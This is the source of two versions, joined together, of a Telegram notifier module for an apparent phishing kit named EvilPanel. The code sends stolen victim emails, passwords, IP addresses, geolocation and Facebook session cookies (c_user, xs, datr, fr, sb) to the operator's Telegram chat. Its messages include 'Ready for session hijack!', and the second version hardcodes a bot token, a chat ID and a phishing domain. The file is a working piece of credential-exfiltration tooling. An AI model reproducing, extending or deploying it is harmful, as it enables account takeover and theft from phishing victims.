import os
import json
import time
import threading
import queue
import hashlib
import requests

try:
    import yaml
except Exception:
    yaml = None

from datetime import datetime

# Default config path on VPS; fallback to repo-relative config/telegram.yaml
DEFAULT_CFG = "/opt/evilpanel/config/telegram.yaml"
FALLBACK_CFG = os.path.join(os.path.dirname(__file__), "..", "config", "telegram.yaml")
FAILED_LOG = "/opt/evilpanel/logs/telegram_failed.jsonl"

# Telegram limits: stay below 30 msg/sec; we use a conservative gap
MIN_SEND_INTERVAL = 0.5


def _escape_md(text: str) -> str:
    if not text:
        return ""
    for ch in "\\`*_{}[]()#+-.!|>~=":
        text = text.replace(ch, f"\\{ch}")
    return text


def _mask_email(email: str) -> str:
    if "@" not in email or len(email) < 6:
        return email
    local, dom = email.split("@", 1)
    if len(local) <= 3:
        masked_local = local[0] + "***"
    else:
        masked_local = local[:3] + "***"
    return f"{masked_local}@{dom}"


def _mask_pw(pw: str) -> str:
    if not pw:
        return ""
    if len(pw) <= 4:
        return "***"
    return pw[:2] + "***" + pw[-2:]


def _mask_cookie(val: str, head=6, tail=4) -> str:
    if not val:
        return ""
    if len(val) <= head + tail:
        return val
    return f"{val[:head]}…{val[-tail:]}"


def _sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest() if s else ""


def _load_config():
    paths = [DEFAULT_CFG, FALLBACK_CFG]
    cfg = {}
    for p in paths:
        if os.path.exists(p):
            try:
                if yaml:
                    with open(p, "r") as f:
                        cfg = yaml.safe_load(f) or {}
                else:
                    # naive parser
                    with open(p, "r") as f:
                        for line in f:
                            if ":" in line:
                                k, v = line.split(":", 1)
                                cfg[k.strip()] = v.strip().strip('"').strip("'")
            except Exception:
                pass
            break
    # env overrides
    cfg_env = {
        "enabled": os.getenv("TELEGRAM_ENABLED"),
        "bot_token": os.getenv("TELEGRAM_BOT_TOKEN"),
        "chat_id": os.getenv("TELEGRAM_CHAT_ID"),
        "timeout": os.getenv("TELEGRAM_TIMEOUT"),
        "max_retries": os.getenv("TELEGRAM_MAX_RETRIES"),
        "backoff_seconds": os.getenv("TELEGRAM_BACKOFF"),
    }
    for k, v in cfg_env.items():
        if v is not None:
            cfg[k] = v
    # normalize
    cfg.setdefault("enabled", False)
    cfg["enabled"] = str(cfg["enabled"]).lower() in ["1", "true", "yes", "on"]
    cfg["timeout"] = float(cfg.get("timeout", 10))
    cfg["max_retries"] = int(cfg.get("max_retries", 5))
    cfg["backoff_seconds"] = float(cfg.get("backoff_seconds", 2))
    cfg["bot_token"] = cfg.get("bot_token", "")
    cfg["chat_id"] = int(cfg.get("chat_id", 0)) if str(cfg.get("chat_id", "")).isdigit() else cfg.get("chat_id", 0)
    return cfg


class TelegramNotifier:
    def __init__(self):
        self.cfg = _load_config()
        self.enabled = self.cfg.get("enabled", False) and self.cfg.get("bot_token") and self.cfg.get("chat_id")
        self.queue = queue.Queue()
        self.last_send = 0.0
        self.worker = threading.Thread(target=self._worker_loop, daemon=True)
        self.worker.start()

    def _log_fail(self, event):
        try:
            with open(FAILED_LOG, "a") as f:
                f.write(json.dumps(event) + "\n")
        except Exception:
            pass

    def _send(self, text: str):
        url = f"https://api.telegram.org/bot{self.cfg['bot_token']}/sendMessage"
        payload = {
            "chat_id": self.cfg["chat_id"],
            "text": text,
            "parse_mode": "MarkdownV2",
        }
        # rate limit
        delta = time.time() - self.last_send
        if delta < MIN_SEND_INTERVAL:
            time.sleep(MIN_SEND_INTERVAL - delta)
        resp = requests.post(url, json=payload, timeout=self.cfg["timeout"])
        self.last_send = time.time()
        if resp.status_code != 200:
            raise RuntimeError(f"HTTP {resp.status_code} {resp.text}")

    def _send_with_retries(self, event):
        attempts = int(self.cfg["max_retries"])
        backoff = float(self.cfg["backoff_seconds"])
        for i in range(attempts):
            try:
                self._send(event["message"])
                return True
            except Exception:
                time.sleep(backoff * (2 ** i))
        return False

    def _worker_loop(self):
        while True:
            event = self.queue.get()
            if event is None:
                break
            ok = self._send_with_retries(event)
            if not ok:
                self._log_fail(event)
            self.queue.task_done()

    def stop(self):
        try:
            self.queue.put_nowait(None)
        except Exception:
            pass

    def enqueue(self, event):
        if not self.enabled:
            return
        try:
            self.queue.put_nowait(event)
        except Exception:
            self._log_fail(event)

    # Public helpers
    def notify_credential(self, email, password, ip="", ua="", ts=None):
        if not self.enabled:
            return
        ts = ts or datetime.utcnow().isoformat()
        msg = self._format_credential(email, password, ip, ua, ts)
        self.enqueue({"type": "credential", "message": msg, "ts": ts})

    def notify_session(self, tokens, ip="", ua="", ts=None):
        if not self.enabled:
            return
        ts = ts or datetime.utcnow().isoformat()
        msg = self._format_session(tokens, ip, ua, ts)
        self.enqueue({"type": "session", "message": msg, "ts": ts})

    def _format_credential(self, email, password, ip, ua, ts):
        masked_email = _escape_md(_mask_email(email))
        pw_mask = _escape_md(_mask_pw(password))
        pw_hash = _escape_md(_sha256_hex(password)[:16])
        ua_s = _escape_md(ua[:80])
        ip_s = _escape_md(ip)
        ts_s = _escape_md(ts)
        lines = [
            "🚨 *CREDENTIAL CAPTURED*",
            f"Email: `{masked_email}`",
            f"Pass: `{pw_mask}` (sha256:{pw_hash}, len={len(password) if password else 0})",
            f"IP/UA: `{ip_s}` / `{ua_s}`",
            f"Captured: `{ts_s}`",
            "Logs: `journalctl -u evilpanel -f`",
        ]
        return "\n".join(lines)

    def _format_session(self, tokens, ip, ua, ts):
        c_user = _escape_md(_mask_cookie(tokens.get("c_user", "")))
        xs = _escape_md(_mask_cookie(tokens.get("xs", "")))
        fr = _escape_md(_mask_cookie(tokens.get("fr", "")))
        sb = _escape_md(_mask_cookie(tokens.get("sb", "")))
        ua_s = _escape_md(ua[:80])
        ip_s = _escape_md(ip)
        ts_s = _escape_md(ts)
        lines = [
            "🚨 *SESSION CAPTURED*",
            f"c_user: `{c_user}`",
            f"xs: `{xs}`",
            f"fr/sb: `{fr}` / `{sb}`",
            f"IP/UA: `{ip_s}` / `{ua_s}`",
            f"Captured: `{ts_s}`",
            "Logs: `journalctl -u evilpanel -f`",
        ]
        return "\n".join(lines)


notifier = TelegramNotifier()


def cli_test(msg: str):
    n = notifier
    if not n.enabled:
        print("Notifier disabled (enable in telegram.yaml or env).")
        return
    n.enqueue({"type": "test", "message": msg, "ts": datetime.utcnow().isoformat()})
    time.sleep(1)


if __name__ == "__main__":
    import sys

    if len(sys.argv) >= 3 and sys.argv[1] == "test":
        cli_test(" ".join(sys.argv[2:]))
    else:
        print("Usage: python3 -m evilpanel.core.telegram_notifier test \"Sample message\"")
"""
EvilPanel Telegram Notifier
Real-time capture notifications via Telegram Bot API
"""
import os
import json
import requests
from datetime import datetime
from typing import Dict, Optional
import threading

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8037918547:AAGq23-FlAbxceZHMcP57hP1bNr7s3e8ubo")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8420914588")
TELEGRAM_ENABLED = os.environ.get("TELEGRAM_ENABLED", "true").lower() == "true"

# API endpoint
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"


def send_message(text: str, parse_mode: str = "Markdown") -> bool:
    """
    Send message to Telegram chat.
    
    Args:
        text: Message text (supports Markdown)
        parse_mode: "Markdown" or "HTML"
    
    Returns:
        True if sent successfully
    """
    if not TELEGRAM_ENABLED:
        return False
    
    try:
        response = requests.post(
            f"{TELEGRAM_API}/sendMessage",
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            },
            timeout=10
        )
        return response.status_code == 200
    except Exception:
        return False


def send_async(text: str, parse_mode: str = "Markdown"):
    """Send message asynchronously (non-blocking)"""
    thread = threading.Thread(target=send_message, args=(text, parse_mode))
    thread.daemon = True
    thread.start()


def notify_credential_capture(email: str, password: str, ip: str, user_agent: str = "", 
                               geo_data: Dict = None) -> bool:
    """
    Send notification for captured credentials.
    
    Args:
        email: Captured email/username
        password: Captured password
        ip: Victim's IP address
        user_agent: Victim's user agent
        geo_data: Geolocation data dict
    """
    geo = geo_data or {}
    
    # Truncate password for notification (show first 3 chars)
    pass_preview = password[:3] + "***" if len(password) > 3 else "***"
    
    message = f"""🎯 *CREDENTIAL CAPTURED*

📧 *Email:* `{email}`
🔑 *Password:* `{pass_preview}` (full in DB)
🌐 *IP:* `{ip}`
📱 *Device:* {user_agent[:50]}...
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

🌍 *Location:*
├ Country: {geo.get('country', 'N/A')}
├ Region: {geo.get('region', 'N/A')}
├ City: {geo.get('city', 'N/A')}
└ ISP: {geo.get('isp', 'N/A')}

⏳ *Waiting for session cookies...*"""
    
    send_async(message)
    return True


def notify_session_capture(c_user: str, xs: str, ip: str, all_cookies: Dict = None,
                           proxy_string: str = None) -> bool:
    """
    Send notification for captured session tokens.
    
    Args:
        c_user: Facebook user ID
        xs: Session token
        ip: Victim's IP
        all_cookies: All captured cookies
        proxy_string: Generated geo-matched proxy
    """
    cookies = all_cookies or {}
    
    message = f"""🍪 *SESSION CAPTURED*

👤 *User ID:* `{c_user}`
🔐 *Session (xs):* `{xs[:20]}...`
🌐 *IP:* `{ip}`
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

🍪 *All Tokens:*
├ c\\_user: `{cookies.get('c_user', 'N/A')}`
├ xs: `{xs[:15]}...`
├ datr: `{cookies.get('datr', 'N/A')[:15] if cookies.get('datr') else 'N/A'}...`
├ fr: `{cookies.get('fr', 'N/A')[:15] if cookies.get('fr') else 'N/A'}...`
└ sb: `{cookies.get('sb', 'N/A')[:15] if cookies.get('sb') else 'N/A'}...`

🌍 *Geo-Proxy:*
`{proxy_string[:60] if proxy_string else 'Not generated'}...`

✅ *Ready for session hijack!*"""
    
    send_async(message)
    return True


def notify_error(error_type: str, details: str) -> bool:
    """Send error notification"""
    message = f"""⚠️ *ERROR*

❌ *Type:* {error_type}
📝 *Details:* {details[:200]}
🕐 *Time:* `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`"""
    
    send_async(message)
    return True


def notify_startup():
    """Send startup notification"""
    message = f"""🚀 *EVILPANEL STARTED*

✅ Service: Online
🌐 Domain: `{os.environ.get('EVILPANEL_DOMAIN', 'frontnews.site')}`
🕐 Time: `{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC`

Ready to capture sessions."""
    
    send_async(message)
    return True


def test_connection() -> bool:
    """Test Telegram bot connection"""
    try:
        response = requests.get(f"{TELEGRAM_API}/getMe", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                bot_name = data["result"].get("username", "Unknown")
                print(f"[Telegram] Connected to bot: @{bot_name}")
                return True
        return False
    except Exception as e:
        print(f"[Telegram] Connection failed: {e}")
        return False


# Test on import (optional)
if __name__ == "__main__":
    print("Testing Telegram connection...")
    if test_connection():
        print("✅ Connection OK")
        send_message("🔧 *Test Message*\n\nEvilPanel Telegram integration working!")
    else:
        print("❌ Connection failed")
